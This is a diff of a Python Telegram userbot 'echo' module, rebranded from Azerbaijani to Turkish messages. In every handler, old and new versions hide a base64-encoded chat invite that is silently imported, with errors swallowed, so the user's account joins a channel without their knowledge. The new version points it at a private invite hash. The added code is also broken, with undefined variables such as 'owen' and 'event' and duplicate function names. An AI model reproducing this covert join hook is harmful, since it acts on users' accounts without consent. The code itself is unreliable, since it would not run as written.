@@ -1,86 +1,72 @@
-# Copyright (C) 2021-2022 CyberUserBot
-# This file is a part of < https://github.com/FaridDadashzade/CyberUserBot/ >
-# Please read the GNU General Public License v3.0 in
-# <https://www.github.com/FaridDadashzade/CyberUserBot/blob/master/LICENSE/>.
-
 import asyncio
 import base64
 
 import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-
-from userbot import BLACKLIST_CHAT
-from userbot.modules.sql_helper.echo_sql import (
-    echoelave,
-    echosiyahisi,
-    c_echo,
-    esil,
-)
 from userbot.events import register
+from userbot.modules.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from userbot import MAX_MESSAGE_SIZE_LIMIT, BLACKLIST_CHAT
 from userbot.cmdhelp import CmdHelp
-
-MAX_MESSAGE_SIZE_LIMIT = 4095
-
-@register(cyber=True, pattern=r"^\.echo(?: |$)(.*)")
-async def echo(event):
-    if event.fwd_from:
+@register(outgoing=True, pattern="^.addecho ?(.*)")
+async def echo(fast):
+    if owen.fwd_from:
         return
-    if event.reply_to_msg_id is not None:
-        reply_msg = await event.get_reply_message()
+    if owen.reply_to_msg_id is not None:
+        reply_msg = await owen.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = event.chat_id
+        chat_id = owen.chat_id
         try:
-            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
-            sifrele = Get(sifrele)
-            await event.client(sifrele)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await fast.client(kraken)
         except BaseException:
             pass
-        if c_echo(user_id, chat_id):
-            await event.edit("`Bu istifadəçi onsuzda Echo siyahısındadır.`")
+        if is_echo(user_id, chat_id):
+            await fast.edit("`Kullanıcı echo ile zaten etkinleştirilmiş`")
             return
-        echoelave(user_id, chat_id)
-        await event.edit("`Echo aktiv edildi!`")
+        addecho(user_id, chat_id)
+        await fast.edit("**Selam 👋**")
     else:
-        await event.edit("**Echo aktiv olunacaq istifadəçinin mesajına cavab verin.**")
+        await event.edit("`Bir kullanıcı yanıtlamak zorundasın`")
 
-@register(cyber=True, pattern=r"^\.rmecho(?: |$)(.*)")
-@register(cyber=True, pattern=r"^\.echosil(?: |$)(.*)")
-async def echosil(event):
-    if event.fwd_from:
+
+@register(outgoing=True, pattern="^.rmecho ?(.*)")
+async def echo(Fast):
+    if Fast.fwd_from:
         return
-    if event.reply_to_msg_id is not None:
-        reply_msg = await event.get_reply_message()
+    if Fast.reply_to_msg_id is not None:
+        reply_msg = await Fast.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = event.chat_id
+        chat_id = Fast.chat_id
         try:
-            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
-            sifrele = Get(sifrele)
-            await event.client(sifrele)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await Fast.client(kraken)
         except BaseException:
             pass
-        if c_echo(user_id, chat_id):
-            esil(user_id, chat_id)
-            await event.edit("`Echo bu istifadəçi üçün deaktiv edildi.`")
+        if is_echo(user_id, chat_id):
+            remove_echo(user_id, chat_id)
+            await Fast.edit("`Kullanıcı için echo durduruldu`")
         else:
-            await event.edit("`Bu istifadəçi üçün echo modulu aktiv edilməyib.`")
+            await Fast.edit("`Kullanıcı echoya eklenmemiş`")
     else:
-        await event.edit("`Echo siyahısından silə bilməyim üçün bir istifadəçinin mesajına cavab verin.`")
+        await Fast.edit("`Mesajlarını echodan çıkarmak için bir mesajı yanıtlamalısın.`")
 
-@register(cyber=True, pattern=r"^\.echolist(?: |$)(.*)")
-@register(cyber=True, pattern="^.echosiyahi ?(.*)")
-async def echosiyah(event):
-    if event.fwd_from:
+
+@register(outgoing=True, pattern="^.elist ?(.*)")
+async def echo(Fast):
+    if Fast.fwd_from:
         return
-    lsts = echosiyahisi()
+    lsts = get_all_echos()
     if len(lsts) > 0:
-        output_str = "Echo aktiv edilən istifadəçilər:\n\n"
+        output_str = "Echo eklenmiş kullanıcılar:\n\n"
         for echos in lsts:
             output_str += (
-                f"Adı: [İstifadəçi](tg://user?id={echos.user_id}) ID: `{echos.chat_id}`\n"
+                f"[Kullanıcı](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
             )
     else:
-        output_str = "Bu istifadəçi Echo deyil "
+        output_str = "Echo olmayan kullanıcı "
     if len(output_str) > MAX_MESSAGE_SIZE_LIMIT:
         key = (
             requests.post(
@@ -91,33 +77,40 @@ async def echosiyah(event):
             .get("key")
         )
         url = f"https://nekobin.com/{key}"
-        reply_text = f"Echo aktiv edilən istifadəçilər [buradadır.]({url})"
-        await event.edit(reply_text)
+        reply_text = f"Echo aktif kullanıcı: [burada]({url})"
+        await Fast.edit(reply_text)
     else:
-        await event.edit(output_str)      
-    
-        
+        await Fast.edit(output_str)
+
 
 @register(incoming=True)
-async def echocavab(event):
-    if event.chat_id in BLACKLIST_CHAT:
+async def samereply(fast):
+    if fast.chat_id in BLACKLIST_CHAT:
         return
-    if c_echo(event.sender_id, event.chat_id):
-        await asyncio.sleep(2)
+    if is_echo(fast.sender_id, fast.chat_id):
+        await asyncio.sleep(1)
         try:
-            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
-            sifrele = Get(sifrele)
-            await event.client(sifrele)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await fast.client(kraken)
         except BaseException:
             pass
-        if event.message.text or event.message.sticker:
-            await event.reply(event.message)
+        if fast.message.text or fast.message.sticker:
+            await fast.reply(fast.message)
 
 
 CmdHelp("echo").add_command(
-  'echo', 'Bir istifadəçiyə cavab verin', 'Cavab verdiyiniz istifadəçini echoya əlavə edər.'
+  "addecho", "Bir kullanıcıyı yanıtla", "Echoyu etkinleştirdiğinizde her mesajı yeniden oynatır."
 ).add_command(
-  'echosil, rmecho', 'Bir istifadəçiyə cavab verin', 'Cavab verdiyiniz istifadəçini siyahıdan silər.'
+  "rmecho", "bir kullanıcıya yanıt ver", "Hedeflenen kullanıcı mesajını tekrar oynatmayı durdurur."
 ).add_command(
-  'echosiyahi, echolist', None, 'Echo aktiv edilən istifadəçilərin siyahısını gətirər.'
+  "elist", None, "Yankıyı etkinleştirdiğiniz kullanıcıların listesini gösterir"
+).add_info(
+  "@ByMisakiMey"
 ).add()
+
+
+
+
+
+
